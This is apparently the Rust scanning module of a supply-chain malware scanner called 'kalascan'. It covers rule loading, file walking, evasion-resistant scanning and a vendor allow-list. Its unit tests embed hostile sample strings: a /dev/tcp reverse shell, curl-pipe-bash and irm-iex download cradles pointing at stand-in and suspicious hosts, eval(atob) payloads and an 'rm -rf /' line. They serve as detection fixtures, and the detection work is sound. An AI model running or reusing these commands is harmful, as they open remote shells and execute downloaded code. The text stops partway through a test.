use crate::RuleMatch;
use regex::Regex;
use std::path::Path;
use walkdir::WalkDir;

/// Human-readable ruleset version (also surfaced by `kalascan rules`).
pub const RULESET_VERSION: &str = "2026.10.1";

/// Critical file extensions for scanning
const CRITICAL_EXTENSIONS: &[&str] = &[
    ".py", ".js", ".ts", ".mjs", ".cjs", ".sh", ".bat", ".ps1", ".vbs", ".php", ".java", ".kt",
];

/// Critical filenames (exact match)
// `extension.vsixmanifest` carries the marketplace links; malicious
// extensions point them at raw-IP C2 hosts.
const CRITICAL_FILENAMES: &[&str] = &[
    "package.json",
    "setup.py",
    "manifest.json",
    "plugin.xml",
    "extension.vsixmanifest",
];

/// Prose files: never executed, and READMEs routinely quote IOC strings that
/// trip YARA. Skipped for the YARA-only pass on non-script files.
const DOC_EXTENSIONS: &[&str] = &[".md", ".markdown", ".rst", ".txt", ".adoc"];

/// Per-file read cap. Larger files are scanned up to this size and flagged,
/// never skipped: padding a payload past the cap used to hide it entirely.
const MAX_SCAN_BYTES: u64 = 4 * 1024 * 1024;

/// Finding name for critical files larger than `MAX_SCAN_BYTES`.
pub const OVERSIZED_FINDING: &str = "Oversized File (partially scanned)";
/// A file whose analysis panicked. Reported, never silently dropped.
pub const SCAN_ERROR_FINDING: &str = "Scanner Error (file not analysed)";
/// A file in a third-party package that could not be opened.
pub const UNREADABLE_FINDING: &str = "Unreadable File (not scanned)";

/// Rule names the correlation pass keys on (see `correlate.rs`).
pub const LOCAL_SERVER: &str = "Local Network Server";
pub const UPLOAD_HANDLER: &str = "HTTP File Upload Handler";
pub const ARCHIVE_EXTRACTION: &str = "Archive Extraction";
pub const EXFIL_SERVICE: &str = "Exfiltration Service Endpoint";
pub const IP_URL: &str = "Public IP URL";
pub const IP_LOOKUP: &str = "IP Lookup Service";
pub const HOST_RECON: &str = "Host Reconnaissance";
pub const REMOTE_BINARY: &str = "Remote Executable Download";
pub const SHELL_START: &str = "Shell Process Start";
pub const RAW_SOCKET: &str = "Raw Socket Connection";
pub const DETACHED_SPAWN: &str = "Detached Process Spawn";
pub const MAKE_EXECUTABLE: &str = "Make File Executable";
pub const OBFUSCATOR_IO: &str = "Obfuscator.io Output";
pub const SEED_ACCESS: &str = "Wallet Seed / Private Key Handling";
pub const INSTALL_HOOK_OVERRIDE: &str = "setup.py Install Hook Override";
pub const SETUP_PY_EXEC: &str = "setup.py Install-time Execution";
pub const SETUP_PY_STAGER: &str = "setup.py Payload Decode/Fetch";
pub const DOWNLOAD_CRADLE: &str = "Download Cradle (fetch piped to interpreter)";
pub const FUNCTION_REQUIRE: &str = "Function Constructor with require";
pub const ESCAPED_EVAL: &str = "Escaped eval Payload";
pub const SIDELOAD: &str = "VS Code Extension Side-loading";
pub const ACCOUNT_ENUM: &str = "Account Enumeration Command";
pub const AI_BASE_URL: &str = "AI API Base URL Override";
pub const SHELL_PROFILE: &str = "Shell Profile Modification";
pub const NPM_PUBLISH: &str = "npm Publish from Code";
pub const FETCH_EVAL: &str = "Download Cradle (fetch then eval)";
pub const HEX_API: &str = "Hex-Encoded API Name";

#[derive(Clone, Debug)]
pub struct Rule {
    pub id: String,
    pub name: String,
    pub pattern: Regex,
    pub severity: String,
    pub description: String,
    pub category: String,
    /// File names this rule never runs on (e.g. npm metadata in package.json).
    pub exclude_files: Vec<String>,
}

#[derive(serde::Deserialize)]
struct RuleFile {
    rule: Vec<RuleDef>,
}

#[derive(serde::Deserialize)]
struct RuleDef {
    id: String,
    name: String,
    severity: String,
    category: String,
    description: String,
    pattern: String,
    #[serde(default)]
    matches: Vec<String>,
    #[serde(default)]
    ignores: Vec<String>,
    #[serde(default)]
    exclude_files: Vec<String>,
}

const SEVERITIES: &[&str] = &["critical", "high", "medium", "low"];

/// Parse a rules TOML file (built-in or `--rules <file>`). Every rule must
/// compile and agree with its own examples, so a broken custom rule fails
/// the scan up front instead of silently matching nothing.
pub fn parse_rules(toml_text: &str) -> anyhow::Result<Vec<Rule>> {
    let file: RuleFile = toml::from_str(toml_text)?;
    file.rule
        .into_iter()
        .map(|d| {
            if !SEVERITIES.contains(&d.severity.as_str()) {
                anyhow::bail!("rule {}: unknown severity '{}'", d.id, d.severity);
            }
            let pattern = Regex::new(&d.pattern)
                .map_err(|e| anyhow::anyhow!("rule {} ({}): {}", d.id, d.name, e))?;
            if let Some(m) = d.matches.iter().find(|m| !pattern.is_match(m)) {
                anyhow::bail!(
                    "rule {} ({}) does not match its example {:?}",
                    d.id,
                    d.name,
                    m
                );
            }
            if let Some(i) = d.ignores.iter().find(|i| pattern.is_match(i)) {
                anyhow::bail!(
                    "rule {} ({}) matches its ignore example {:?}",
                    d.id,
                    d.name,
                    i
                );
            }
            Ok(Rule {
                id: d.id,
                name: d.name,
                pattern,
                severity: d.severity,
                description: d.description,
                category: d.category,
                exclude_files: d.exclude_files,
            })
        })
        .collect()
}

pub fn load_rules_file(path: &Path) -> anyhow::Result<Vec<Rule>> {
    let text = std::fs::read_to_string(path)
        .map_err(|e| anyhow::anyhow!("cannot read rules file {}: {}", path.display(), e))?;
    parse_rules(&text).map_err(|e| anyhow::anyhow!("{}: {}", path.display(), e))
}

static BUILTIN_RULES: std::sync::LazyLock<Vec<Rule>> = std::sync::LazyLock::new(|| {
    parse_rules(include_str!("../rules/builtin.toml")).expect("rules/builtin.toml is valid")
});

impl Rule {
    pub fn applies_to(&self, ext: &str, filename: &str) -> bool {
        if self.exclude_files.iter().any(|f| f == filename) {
            return false;
        }
        if self.category == "obfuscation" {
            return true;
        }
        if self.category == "exfiltration" {
            return CRITICAL_EXTENSIONS.contains(&ext) || CRITICAL_FILENAMES.contains(&filename);
        }
        if self.category == "file_access" {
            return CRITICAL_EXTENSIONS.contains(&ext);
        }
        // Code in setup.py runs at `pip install` time; elsewhere these calls are ordinary.
        if self.category == "install_hook" {
            return filename == "setup.py";
        }
        if self.category == "npm_hook" {
            return filename == "package.json";
        }
        true
    }
}

/// Built-in rules from `rules/builtin.toml`, parsed and compiled once.
pub fn build_rules() -> Vec<Rule> {
    BUILTIN_RULES.clone()
}

pub fn is_critical_file(filename: &str) -> bool {
    let lower = filename.to_lowercase();
    if CRITICAL_FILENAMES.contains(&lower.as_str()) {
        return true;
    }
    CRITICAL_EXTENSIONS.iter().any(|ext| lower.ends_with(ext))
}

pub fn get_extension(filename: &str) -> &str {
    let lower = filename.to_lowercase();
    for ext in CRITICAL_EXTENSIONS {
        if lower.ends_with(ext) {
            return ext;
        }
    }
    ""
}

/// Directories not worth scanning. In the operator's own checkout that is
/// build output and virtualenvs; in someone else's code only the clone's own
/// `.git`. A package author can name a payload directory `lib/target/` or
/// `__pycache__/`, and those used to be skipped at any depth.
/// `node_modules` is always scanned: in a VSIX/CRX it is shipped, executed
/// code and the obvious place to hide a payload.
pub fn skip_dir(e: &walkdir::DirEntry, own_tree: bool) -> bool {
    if !e.file_type().is_dir() {
        return false;
    }
    let name = e.file_name().to_string_lossy();
    if own_tree {
        [
            ".git",
            "__pycache__",
            ".tox",
            ".eggs",
            "target",
            "venv",
            ".venv",
        ]
        .contains(&name.as_ref())
    } else {
        e.depth() == 1 && name == ".git"
    }
}

/// Scan directory, optionally restricted to `changed` repo-relative paths
/// (used by `--changed-only` for PR scans). `own_tree`: the operator's own
/// checkout, scanned in place. Only there are build directories skipped and
/// inline `kalascan:ignore` markers honoured; in a downloaded package they
/// are the author's way to opt out of the scan.
pub fn scan_directory_filtered<P: AsRef<Path>>(
    dir: P,
    custom_yara_dir: Option<&Path>,
    extra_rules: &[Rule],
    changed: Option<&std::collections::HashSet<std::path::PathBuf>>,
    own_tree: bool,
) -> (usize, usize, Vec<RuleMatch>) {
    let mut rules = build_rules();
    rules.extend_from_slice(extra_rules);
    let yara_engine = crate::yara_engine::YaraEngine::new(custom_yara_dir);
    let mut total_files = 0usize;
    let mut targets: Vec<Target> = Vec::new();
    let mut scanned_files = 0usize;

    // Phase 1: collect candidate files (same order as the old single pass,
    // so results stay deterministic).
    for entry in WalkDir::new(dir.as_ref())
        .into_iter()
        .filter_entry(|e| !skip_dir(e, own_tree))
    {
        let entry = match entry {
            Ok(e) => e,
            Err(_) => continue,
        };

        if !entry.file_type().is_file() {
            continue;
        }

        total_files += 1;

        let filename = entry.file_name().to_string_lossy().to_string();
        let critical = is_critical_file(&filename);
        let lower = filename.to_lowercase();
        if !critical && DOC_EXTENSIONS.iter().any(|ext| lower.ends_with(ext)) {
            continue;
        }

        let rel_path = entry
            .path()
            .strip_prefix(dir.as_ref())
            .unwrap_or(entry.path())
            .to_string_lossy()
            .to_string();

        // `--changed-only` filter: skip files not in the changed set
        if let Some(changed) = changed {
            if !changed.contains(std::path::Path::new(&rel_path)) {
                continue;
            }
        }

        scanned_files += critical as usize;
        targets.push(Target {
            rel_path,
            filename,
            abs_path: entry.path().to_path_buf(),
            critical,
        });
    }

    // Phase 2: scan in parallel. Workers take the next file from a shared
    // counter: fixed chunks put a `dist/` of large bundles on one or two
    // workers while the rest sat idle. Results go back into walk order, so
    // the output is the same as a sequential pass.
    let workers = std::thread::available_parallelism()
        .map(|n| n.get())
        .unwrap_or(4)
        .clamp(1, 16)
        .min(targets.len().max(1));
    let next = std::sync::atomic::AtomicUsize::new(0);
    let mut per_file: Vec<(usize, Vec<RuleMatch>)> = std::thread::scope(|scope| {
        let handles: Vec<_> = (0..workers)
            .map(|_| {
                scope.spawn(|| {
                    let mut yara = yara_engine.scanner();
                    let mut done = Vec::new();
                    loop {
                        let i = next.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
                        let Some(target) = targets.get(i) else {
                            break;
                        };
                        done.push((i, scan_target(target, &rules, yara.as_mut(), own_tree)));
                    }
                    done
                })
            })
            .collect();
        // scan_target contains per-file panics, so a worker panic is a bug in
        // this loop: fail the scan rather than report a partial result as clean.
        handles
            .into_iter()
            .flat_map(|h| h.join().expect("scan worker panicked"))
            .collect()
    });
    per_file.sort_unstable_by_key(|(i, _)| *i);
    let matches = per_file.into_iter().flat_map(|(_, m)| m).collect();

    (total_files, scanned_files, matches)
}

struct Target {
    rel_path: String,
    filename: String,
    abs_path: std::path::PathBuf,
    /// Script/manifest file: gets RegEx + entropy rules. Every file gets YARA.
    critical: bool,
}

/// Read at most `MAX_SCAN_BYTES`, returning the bytes and the real file size.
fn read_capped(path: &Path) -> Option<(Vec<u8>, u64)> {
    use std::io::Read;
    let file = std::fs::File::open(path).ok()?;
    let size = file.metadata().ok()?.len();
    let mut buf = Vec::new();
    file.take(MAX_SCAN_BYTES).read_to_end(&mut buf).ok()?;
    Some((buf, size))
}

/// Scan one file. A panic in the analysis becomes a finding on that file:
/// it used to drop every finding of every file in the worker's chunk, and a
/// non-ASCII comment near a payload was enough to trigger it.
fn scan_target(
    target: &Target,
    rules: &[Rule],
    yara: Option<&mut yara_x::Scanner<'_>>,
    own_tree: bool,
) -> Vec<RuleMatch> {
    let finding = |name: &str, severity: &str, context: String| RuleMatch {
        file_path: target.rel_path.clone(),
        line_number: 1,
        matched_pattern: name.to_string(),
        severity: severity.to_string(),
        context,
    };
    let Some((bytes, size)) = read_capped(&target.abs_path) else {
        // Mode-0000 tar entries unpack unreadable; npm re-modes them on
        // install, so the victim runs a file the scan never saw.
        return if own_tree {
            Vec::new()
        } else {
            vec![finding(
                UNREADABLE_FINDING,
                "medium",
                "Could not read this file; it was not scanned".to_string(),
            )]
        };
    };
    std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
        scan_bytes(target, &bytes, size, rules, yara, own_tree)
    }))
    .unwrap_or_else(|panic| {
        let why = panic
            .downcast_ref::<String>()
            .map(String::as_str)
            .or_else(|| panic.downcast_ref::<&str>().copied())
            .unwrap_or("panic");
        vec![finding(
            SCAN_ERROR_FINDING,
            "high",
            format!(
                "Analysis of this file failed and it was not scanned: {}",
                why
            ),
        )]
    })
}

fn scan_bytes(
    target: &Target,
    bytes: &[u8],
    size: u64,
    rules: &[Rule],
    yara: Option<&mut yara_x::Scanner<'_>>,
    honor_markers: bool,
) -> Vec<RuleMatch> {
    let Target {
        rel_path,
        filename,
        critical,
        ..
    } = target;
    // Raw bytes, not the lossy text: U+FFFD replacement changes what a
    // binary signature sees.
    let yara_hits = || {
        yara.map(|s| crate::yara_engine::scan_with(s, rel_path, bytes))
            .unwrap_or_default()
    };

    if !critical {
        let mut out = yara_hits();
        if crate::workflow::is_workflow(rel_path) {
            out.extend(crate::workflow::scan(
                rel_path,
                &String::from_utf8_lossy(bytes),
            ));
        }
        return out;
    }

    // Lossy: one invalid byte used to make read_to_string fail and skip the file.
    let content = String::from_utf8_lossy(bytes);

    // Whole-file inline suppression marker
    if honor_markers && content.contains("kalascan:ignore-file") {
        return Vec::new();
    }

    let mut out = Vec::new();
    if size > MAX_SCAN_BYTES {
        out.push(RuleMatch {
            file_path: rel_path.clone(),
            line_number: 1,
            matched_pattern: OVERSIZED_FINDING.to_string(),
            severity: "low".to_string(),
            context: format!(
                "File is {} bytes; only the first {} MiB were scanned",
                size,
                MAX_SCAN_BYTES / (1024 * 1024)
            ),
        });
    }

    let mut matches = Vec::new();
    // Byte offset per finding of this file, for chain proximity checks.
    let mut offsets: Vec<usize> = Vec::new();
    let newlines: Vec<usize> = content.match_indices('\n').map(|(i, _)| i).collect();
    // 0-based line index and its start offset, by binary search: a minified
    // bundle is one 4 MB line, and scanning back to its start per match made
    // such files ~10x slower than the same code with line breaks.
    let line_of = |pos: usize| newlines.partition_point(|&i| i < pos);
    let line_start = |idx: usize| if idx == 0 { 0 } else { newlines[idx - 1] + 1 };
    let ignored_lines: std::collections::HashSet<usize> = if honor_markers {
        content
            .match_indices("kalascan:ignore")
            .map(|(pos, _)| line_of(pos))
            .collect()
    } else {
        std::collections::HashSet::new()
    };
    let ext = get_extension(filename);

    for rule in rules {
        if !rule.applies_to(ext, filename) {
            continue;
        }

        for cap in rule.pattern.find_iter(&content) {
            let line = line_of(cap.start());
            if ignored_lines.contains(&line)
                || is_comment_only_line(&content, line_start(line), cap.start())
            {
                continue;
            }
            let is_ip_rule = rule.name == "Hardcoded IP Address" || rule.name == IP_URL;
            let ip_text = cap.as_str().rsplit('/').next().unwrap_or_default();
            if is_ip_rule && !is_public_ipv4(ip_text) {
                continue;
            }
            let is_download_rule = rule.name == REMOTE_BINARY || rule.name == DOWNLOAD_CRADLE;
            if is_download_rule && is_vendor_download(cap.as_str()) {
                continue;
            }
            offsets.push(cap.start());
            matches.push(RuleMatch {
                file_path: rel_path.clone(),
                line_number: line + 1,
                matched_pattern: rule.name.to_string(),
                severity: rule.severity.to_string(),
                context: get_context(&content, cap.start(), cap.end()),
            });
        }
    }

    // Advanced entropy, invisible zero-width, Trojan Source, homoglyphs.
    matches.extend(crate::entropy::scan_advanced_obfuscation(
        rel_path, &content,
    ));
    matches.extend(yara_hits());

    // Entropy / YARA hits only know their line: use the line start.
    for m in &matches[offsets.len()..] {
        offsets.push(line_start(
            m.line_number.saturating_sub(1).min(newlines.len()),
        ));
    }
    let chains = crate::correlate::correlate_file(rel_path, &content, &matches, &offsets);
    out.extend(matches);
    out.extend(chains);
    out
}

/// Official vendor download / installer hosts: Playwright fetching Chrome
/// from dl.google.com, the Python extension running astral.sh's uv
/// installer. Not GitHub, Drive or OneDrive: attackers host payloads there.
fn is_vendor_download(url: &str) -> bool {
    const VENDORS: &[&str] = &[
        "dl.google.com",
        "astral.sh",
        "sh.rustup.rs",
        "get.docker.com",
        "deno.land",
        "bun.sh",
        "install.python-poetry.org",
        "get.pnpm.io",
        "pyenv.run",
        "microsoft.com",
        "aka.ms",
        "visualstudio.com",
        "nodejs.org",
        "python.org",
        "mozilla.org",
        "mozilla.net",
        "docker.com",
        "playwright.dev",
        "apple.com",
        // GitHub's own link shortener (Copilot CLI installer).
        "gh.io",
        // The whole TLD is run by Google (Antigravity CLI installer).
        "google",
    ];
    // Official installers on GitHub raw, pinned to orgs nobody else controls.
    const VENDOR_PATHS: &[&str] = &[
        "raw.githubusercontent.com/nvm-sh/nvm/",
        "raw.githubusercontent.com/creationix/nvm/",
        "raw.githubusercontent.com/homebrew/install/",
    ];
    let Some(rest) = url.split("://").nth(1) else {
        return false;
    };
    let rest = rest.to_ascii_lowercase();
    let host = rest.split(['/', ':', '?']).next().unwrap_or_default();
    VENDORS
        .iter()
        .any(|v| host == *v || host.ends_with(&format!(".{}", v)))
        || VENDOR_PATHS.iter().any(|p| rest.starts_with(p))
}

/// Loopback, private, link-local and version-like invalid quads are not C2.
fn is_public_ipv4(text: &str) -> bool {
    match text.parse::<std::net::Ipv4Addr>() {
        Ok(ip) => {
            !(ip.is_loopback()
                || ip.is_private()
                || ip.is_link_local()
                || ip.is_unspecified()
                || ip.is_broadcast()
                || ip.is_documentation())
        }
        Err(_) => false,
    }
}

/// Byte index at or below `i` that starts a char (std's version needs a
/// newer toolchain than the README promises).
pub(crate) fn floor_boundary(s: &str, i: usize) -> usize {
    let mut i = i.min(s.len());
    while !s.is_char_boundary(i) {
        i -= 1;
    }
    i
}

/// `s` cut to at most `max` bytes on a char boundary, with "..." when cut.
pub(crate) fn truncate_on_char(s: &str, max: usize) -> String {
    if s.len() <= max {
        return s.to_string();
    }
    format!("{}...", &s[..floor_boundary(s, max)])
}

/// Text before a match that the block-comment checks look at. A minified
/// bundle is one line: nobody comments code out there.
const COMMENT_SCAN_LIMIT: usize = 1000;

/// True when the match at `start` (on the line beginning at `line_start`)
/// sits inside a comment (`//`, `#`, `/* ...`). Commented-out code is not
/// executed; flagging it was pure noise.
///
/// A block comment counts only when the line opens with `/*`: any `/*`
/// further along may be inside a string, and `var a="/*";eval(atob(...))`
/// used to hide everything after it. Cost: code followed by a trailing
/// `/* exec(x) */` on the same line is now reported.
fn is_comment_only_line(content: &str, line_start: usize, start: usize) -> bool {
    let before = &content[line_start..start];
    let trimmed = before.trim_start();
    if trimmed.starts_with("//") || trimmed.starts_with('#') {
        return true;
    }
    // A block closed before the match means code follows (` * x */ fetch(evil)`).
    if before.len() > COMMENT_SCAN_LIMIT || before.contains("*/") {
        return false;
    }
    if trimmed.starts_with("/*") {
        return true;
    }
    // JSDoc continuation ` * text`: only when the line above is a comment too.
    if line_start > 0 && (trimmed.starts_with("* ") || trimmed == "*") {
        let lo = floor_boundary(content, line_start.saturating_sub(COMMENT_SCAN_LIMIT));
        let above = &content[lo..line_start - 1];
        // A line above longer than the window is code, not a comment.
        let prev = match above.rfind('\n') {
            Some(i) => Some(&above[i + 1..]),
            None if lo == 0 => Some(above),
            None => None,
        };
        return prev.is_some_and(|p| {
            let p = p.trim_start();
            (p.starts_with("/*") || p.starts_with('*')) && !p.contains("*/")
        });
    }
    false
}

/// Up to 3 lines either side of the match, from at most `CONTEXT_SPAN` bytes
/// each way. The old version copied the whole line per match (4 MB on a
/// bundle), often cut the match itself off, and sliced at byte 200 even
/// inside a multi-byte char, which panicked.
const CONTEXT_SPAN: usize = 80;

pub(crate) fn get_context(content: &str, start: usize, end: usize) -> String {
    let lo = floor_boundary(content, start.saturating_sub(CONTEXT_SPAN));
    let mut before: Vec<&str> = content[lo..start].rsplit('\n').take(3).collect();
    before.reverse();

    let hi = floor_boundary(content, end.saturating_add(CONTEXT_SPAN));
    let after: Vec<&str> = content[end..hi].split('\n').take(3).collect();

    let ctx = format!(
        "{}\n>>> {} <<<\n{}",
        before.join("\n"),
        &content[start..end],
        after.join("\n")
    );
    truncate_on_char(&ctx, 200)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_scan_directory_filtered_parallel_is_deterministic() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("a.py"),
            "discord.com/api/webhooks/123456789012345678/ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrst\n",
        )
        .unwrap();
        std::fs::write(dir.path().join("b.py"), "eval('x')\n").unwrap();

        let (total, scanned, mut first) =
            scan_directory_filtered(dir.path(), None, &[], None, true);
        let (_, _, mut second) = scan_directory_filtered(dir.path(), None, &[], None, true);

        let key = |m: &RuleMatch| {
            (
                m.file_path.clone(),
                m.line_number,
                m.matched_pattern.clone(),
            )
        };
        first.sort_by_key(key);
        second.sort_by_key(key);
        assert_eq!(first, second);
        assert_eq!(total, 2);
        assert_eq!(scanned, 2);
        assert!(!first.is_empty());
    }

    #[test]
    fn test_evasion_tricks_no_longer_hide_files() {
        let dir = tempfile::tempdir().unwrap();
        // Invalid UTF-8 byte used to make the whole file unreadable.
        let mut bad_utf8 = b"\xff\xfe\n".to_vec();
        bad_utf8.extend_from_slice(b"eval(payload)\n");
        std::fs::write(dir.path().join("a.js"), bad_utf8).unwrap();
        // Padding past the old 1 MiB cap used to skip the file entirely.
        let mut padded = "eval(payload)\n".to_string();
        padded.push_str(&" ".repeat(MAX_SCAN_BYTES as usize));
        std::fs::write(dir.path().join("b.js"), padded).unwrap();
        // Non-script file: only YARA applies, it used to be skipped.
        std::fs::write(
            dir.path().join("payload.bin"),
            b"\x7fELF\x00/bin/sh -i >& /dev/tcp/10.0.0.1/4444\x00",
        )
        .unwrap();
        // Docs quoting IOCs are not payloads.
        std::fs::write(
            dir.path().join("README.md"),
            "Detects `/bin/sh -i >& /dev/tcp/` reverse shells\n",
        )
        .unwrap();

        let (total, scanned, matches) = scan_directory_filtered(dir.path(), None, &[], None, true);
        assert_eq!((total, scanned), (4, 2));
        assert!(!matches.iter().any(|m| m.file_path == "README.md"));
        let has = |file: &str, rule: &str| {
            matches
                .iter()
                .any(|m| m.file_path == file && m.matched_pattern == rule)
        };
        assert!(has("a.js", "eval() Usage"));
        assert!(matches
            .iter()
            .any(|m| m.file_path == "a.js" && m.line_number == 2));
        assert!(has("b.js", "eval() Usage"));
        assert!(has("b.js", OVERSIZED_FINDING));
        assert!(has("payload.bin", "YARA Rule: ReverseShellGeneric"));
    }

    /// Rule examples (`matches` / `ignores` in rules/builtin.toml) are
    /// checked by `parse_rules`; this also pins ids, names and the names
    /// correlate.rs keys on.
    #[test]
    fn test_builtin_rules_load_and_are_consistent() {
        let rules = parse_rules(include_str!("../rules/builtin.toml")).unwrap();
        let ids: std::collections::HashSet<_> = rules.iter().map(|r| r.id.as_str()).collect();
        let names: std::collections::HashSet<_> = rules.iter().map(|r| r.name.as_str()).collect();
        assert_eq!(ids.len(), rules.len(), "duplicate rule id");
        assert_eq!(names.len(), rules.len(), "duplicate rule name");
        for name in [
            LOCAL_SERVER,
            UPLOAD_HANDLER,
            ARCHIVE_EXTRACTION,
            EXFIL_SERVICE,
            IP_URL,
            IP_LOOKUP,
            HOST_RECON,
            REMOTE_BINARY,
            SHELL_START,
            RAW_SOCKET,
            DETACHED_SPAWN,
            MAKE_EXECUTABLE,
            OBFUSCATOR_IO,
            SEED_ACCESS,
            INSTALL_HOOK_OVERRIDE,
            SETUP_PY_EXEC,
            SETUP_PY_STAGER,
            DOWNLOAD_CRADLE,
            FUNCTION_REQUIRE,
            ESCAPED_EVAL,
            SIDELOAD,
            ACCOUNT_ENUM,
            AI_BASE_URL,
            SHELL_PROFILE,
            NPM_PUBLISH,
            FETCH_EVAL,
            HEX_API,
            "Hardcoded IP Address",
            "Post-Install Script",
            "URL Fetch Command",
        ] {
            assert!(
                names.contains(name),
                "correlation keys on missing rule {:?}",
                name
            );
        }
        let known = [
            "exfiltration",
            "file_access",
            "obfuscation",
            "ransomware",
            "supply_chain",
            "network",
            "file_write",
            "recon",
            "install_hook",
            "npm_hook",
        ];
        for r in &rules {
            assert!(
                known.contains(&r.category.as_str()),
                "{}: category {}",
                r.id,
                r.category
            );
        }
    }

    #[test]
    fn test_custom_rules_are_validated() {
        let ok = "[[rule]]\nid='X-1'\nname='Evil Host'\nseverity='high'\ncategory='exfiltration'\n\
                  description='d'\npattern='evil\\.example'\nmatches=['https://evil.example/x']";
        assert_eq!(parse_rules(ok).unwrap()[0].name, "Evil Host");
        let bad_example = ok.replace("evil.example/x", "good.example/x");
        assert!(parse_rules(&bad_example)
            .unwrap_err()
            .to_string()
            .contains("does not match"));
        let bad_regex = ok.replace("evil\\.example", "evil(");
        assert!(parse_rules(&bad_regex).is_err());
        let bad_severity = ok.replace("'high'", "'urgent'");
        assert!(parse_rules(&bad_severity).is_err());
    }

    #[test]
    fn test_vendor_download_hosts() {
        assert!(is_vendor_download(
            "https://dl.google.com/chrome/install/ChromeStandaloneSetup64.exe"
        ));
        assert!(is_vendor_download("https://download.microsoft.com/a/b.msi"));
        assert!(!is_vendor_download(
            "https://drive.google.com/uc?id=x&export=download.exe"
        ));
        assert!(!is_vendor_download(
            "https://raw.githubusercontent.com/u/r/main/run.ps1"
        ));
        assert!(!is_vendor_download("http://paxfallow.ru/Lightshot.exe"));
        assert!(!is_vendor_download("http://microsoft.com.evil.ru/a.exe"));
        assert!(is_vendor_download(
            "irm https://astral.sh/uv/install.ps1 | iex"
        ));
        assert!(!is_vendor_download("irm https://niggboo.com/aaa | iex"));
        assert!(is_vendor_download(
            "curl -fsSL https://gh.io/copilot-install | bash"
        ));
        assert!(is_vendor_download(
            "irm https://antigravity.google/cli/install.ps1 | iex"
        ));
        assert!(!is_vendor_download("https://evil.google.evil.ru/a.sh"));
        assert!(is_vendor_download(
            "curl https://raw.githubusercontent.com/creationix/nvm/master/install.sh | bash"
        ));
        assert!(!is_vendor_download(
            "curl https://raw.githubusercontent.com/nvm-sh-evil/nvm/x.sh | bash"
        ));
    }

    #[test]
    fn test_public_ipv4_filter() {
        assert!(!is_public_ipv4("127.0.0.1"));
        assert!(!is_public_ipv4("192.168.1.10"));
        assert!(!is_public_ipv4("1.2.300.4"));
        assert!(is_public_ipv4("45.9.148.3"));
    }

    #[test]
    fn test_exec_match_stays_on_its_line() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("a.py"), "x = 1\nexec(code)\n").unwrap();
        let (_, _, matches) = scan_directory_filtered(dir.path(), None, &[], None, true);
        let m = matches
            .iter()
            .find(|m| m.matched_pattern == "exec() Usage")
            .unwrap();
        assert_eq!(m.line_number, 2);
    }

    #[test]
    fn test_is_critical_file() {
        assert!(is_critical_file("script.py"));
        assert!(is_critical_file("script.js"));
        assert!(is_critical_file("batch.bat"));
        assert!(is_critical_file("package.json"));
        assert!(!is_critical_file("readme.md"));
        assert!(!is_critical_file("image.png"));
    }

    fn comment_at(content: &str, pos: usize) -> bool {
        let line_start = content[..pos].rfind('\n').map_or(0, |i| i + 1);
        is_comment_only_line(content, line_start, pos)
    }

    #[test]
    fn test_commented_out_code_is_ignored() {
        let content = "// exec(command, { name: \"X\" }, (err) => {});\n";
        assert!(comment_at(content, 5)); // inside the comment
        let real = "exec(command, { name: \"X\" }, (err) => {});\n";
        assert!(!comment_at(real, 3));
        let py = "# os.system('rm -rf /')\n";
        assert!(comment_at(py, 4));
        let block = "/* exec(cmd) */\n";
        assert!(comment_at(block, 3));
        // JSDoc continuation lines (ngrok's typings: `* // https://x.ngrok.io`).
        let doc = "/**\n * const url = await ngrok.connect(); // https://a.ngrok.io\n */";
        assert!(comment_at(doc, doc.find("https").unwrap()));
        // Not a comment: the block closed before the match, or never opened.
        let closed = "/**\n * x */ fetch('https://a.ngrok.io')";
        assert!(!comment_at(closed, closed.find("https").unwrap()));
        let product = "/** doc */\n* fetch('https://a.ngrok.io')";
        assert!(!comment_at(product, product.find("https").unwrap()));
        // A `/*` inside a string opens nothing.
        let string = "var a=\"/*\";eval(atob(\"ZXZpbA==\"));";
        assert!(!comment_at(string, string.find("eval").unwrap()));
    }

    fn scan(dir: &std::path::Path, own_tree: bool) -> Vec<RuleMatch> {
        scan_directory_filtered(dir, None, &[], None, own_tree).2
    }

    fn has(matches: &[RuleMatch], file: &str, rule: &str) -> bool {
        matches
            .iter()
            .any(|m| m.file_path == file && m.matched_pattern == rule)
    }

    #[test]
    fn multibyte_text_near_a_match_neither_panics_nor_hides_files() {
        let dir = tempfile::tempdir().unwrap();
        // Byte 200 of the context used to fall inside `中` and panic, and the
        // panic dropped every finding of the worker's chunk.
        let src = format!(
            "// {}中中中中中\nconst {{ execSync }} = require(\"child_process\"); execSync(\"curl -fsSL https://evil.example/x.sh | bash\");\n",
            "a".repeat(196)
        );
        std::fs::write(dir.path().join("a.js"), src).unwrap();
        let matches = scan(dir.path(), false);
        assert!(has(&matches, "a.js", DOWNLOAD_CRADLE));
        assert!(!matches
            .iter()
            .any(|m| m.matched_pattern == SCAN_ERROR_FINDING));

        let ctx = get_context("中".repeat(100).as_str(), 150, 153);
        assert!(ctx.contains(">>> 中 <<<"));
    }

    #[test]
    fn context_shows_the_match_on_a_minified_line() {
        let line = format!("{}eval(x){}", "a=1;".repeat(10_000), "b=2;".repeat(10_000));
        let at = line.find("eval").unwrap();
        let ctx = get_context(&line, at, at + 5);
        assert!(ctx.contains(">>> eval( <<<"), "{}", ctx);
        assert!(ctx.len() <= 203);
    }

    #[test]
    fn build_dirs_and_markers_are_skipped_only_in_own_tree() {
        let dir = tempfile::tempdir().unwrap();
        let target = dir.path().join("lib/target");
        std::fs::create_dir_all(&target).unwrap();
        std::fs::write(target.join("payload.js"), "eval(atob(p));\n").unwrap();
        std::fs::write(
            dir.path().join("muted.js"),
            "/* kalascan:ignore-file */\neval(atob(p));\n",
        )
        .unwrap();
        std::fs::write(dir.path().join("line.js"), "eval(p); // kalascan:ignore\n").unwrap();

        let package = scan(dir.path(), false);
        for file in ["lib/target/payload.js", "muted.js", "line.js"] {
            assert!(has(&package, file, "eval() Usage"), "{} not scanned", file);
        }
        let own = scan(dir.path(), true);
        assert!(own.is_empty(), "{:?}", own);
    }

    #[test]
    fn rules_starting_at_a_newline_keep_their_own_line() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("s.py"),
